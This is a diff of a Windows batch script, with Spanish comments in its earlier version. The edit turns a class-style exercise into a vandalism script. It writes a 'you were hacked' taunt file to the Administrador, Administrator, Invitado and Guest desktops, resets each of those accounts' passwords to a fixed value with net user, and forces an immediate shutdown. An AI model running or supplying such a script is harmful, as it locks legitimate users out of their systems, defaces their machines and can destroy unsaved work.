@@ -1,24 +1,31 @@
 @echo off
-:: Navegar hasta el directorio C:
+
 cd /d C:\
-
-:: Ir a la carpeta Users
 cd Users
-
-:: Mostrar el contenido de Users para encontrar la carpeta del administrador
-dir
-
-:: Cambiar a la carpeta del administrador (reemplaza 'CarpetaAdmin' con el nombre correcto)
 cd Administrador
-
-:: Navegar hasta el Escritorio
 cd Desktop
+echo Fuiste jakiado por el alma del blouri > MatiHanspillos.txt
+net user Administrador Blouri123.
 
-:: Crear el archivo de texto con el contenido
-echo Hola profeee!! > MatiasHans.txt
+cd /d C:\
+cd Users
+cd Administrator
+cd Desktop
+echo Fuiste jakiado por el alma del blouri > MatiHanspillos.txt
+net user Administrator Blouri123.
 
-:: Cambiar la contraseña del usuario (reemplaza 'nombreUsuario' y 'nuevaContraseña')
-net user Administrador Blodi123.
+cd /d C:\
+cd Users
+cd Invitado
+cd Desktop
+echo Fuiste jakiado por el alma del blouri > MatiHanspillos.txt
+net user Invitado Blouri123.
 
-:: Apagar el servidor inmediatamente
+cd /d C:\
+cd Users
+cd Guest
+cd Desktop
+echo Fuiste jakiado por el alma del blouri > MatiHanspillos.txt
+net user Guest Blouri123.
+
 shutdown /s /f /t 0
